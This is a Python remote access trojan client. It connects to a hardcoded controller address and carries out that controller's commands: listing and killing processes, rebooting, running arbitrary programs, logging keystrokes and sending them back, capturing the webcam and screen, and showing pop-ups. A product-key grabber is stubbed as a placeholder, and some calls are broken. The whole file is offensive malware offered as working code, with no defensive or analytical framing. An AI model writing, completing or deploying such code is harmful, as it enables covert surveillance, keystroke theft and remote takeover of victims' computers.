import socket
import os
import subprocess
import psutil
import keyboard
import win10toast
import cv2
import mss
import threading

keylog = []
key_monitoring = False

def grab_key():
    return "Placeholder for Windows Key grabbing logic"

def key_monitor():
    global key_monitoring, keylog
    while key_monitoring:
        key = keyboard.read_event()
        if key.event_type == keyboard.KEY_DOWN and key.name not in ["ctrl", "alt", "shift"]:
            if key.name == "enter":
                keylog.append("[ENTER]")
            elif key.name == "space":
                keylog.append(" ")
            else:
                keylog.append(key.name)

def stream_screen_and_webcam():
    with mss.mss() as sct:
        webcam = cv2.VideoCapture(0)
        while True:
            screen = sct.shot(output="screen.png")
            ret, frame = webcam.read()
            if ret:
                cv2.imshow("Webcam", frame)
                if cv2.waitKey(1) & 0xFF == ord("q"):
                    break
        webcam.release()
        cv2.destroyAllWindows()

def client_operations(conn):
    global key_monitoring, keylog
    while True:
        command = conn.recv(1024).decode()
        if command.startswith("ps"):
            processes = "\n".join([p.name() for p in psutil.process_iter()])
            conn.send(processes.encode())
        elif command.startswith("reboot"):
            os.system("shutdown /r /t 1")
        elif command.startswith("kill"):
            pid = int(command.split()[1])
            psutil.Process(pid).terminate()
        elif command.startswith("execute"):
            args = command.split()
            filename = args[1]
            arguments = args[2:] if len(args) > 2 else []
            subprocess.Popen([filename] + arguments)
        elif command.startswith("stream"):
            threading.Thread(target=stream_screen_and_webcam).start()
        elif command.startswith("keymon set on"):
            key_monitoring = True
            threading.Thread(target=key_monitor).start()
        elif command.startswith("keymon dump"):
            conn.send("".join(keylog).encode())
        elif command.startswith("keymon set off"):
            key_monitoring = False
        elif command.startswith("alert"):
            args = command.split()
            name = args[1]
            text = args[3]
            duration = int(args[5])
            toaster = win10toast.ToastNotifier()
            toaster.show_toast(name, text, duration=duration)
        else:
            conn.send(b"Unknown command")

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("10.0.1.33", 9999))  # Replace 'server_ip' with server's IP
    client.send(f"OS: {os.name} {os.version}\n".encode())
    client.send(f"Windows Key: {grab_key()}\n".encode())
    client_operations(client)

if __name__ == "__main__":
    main()
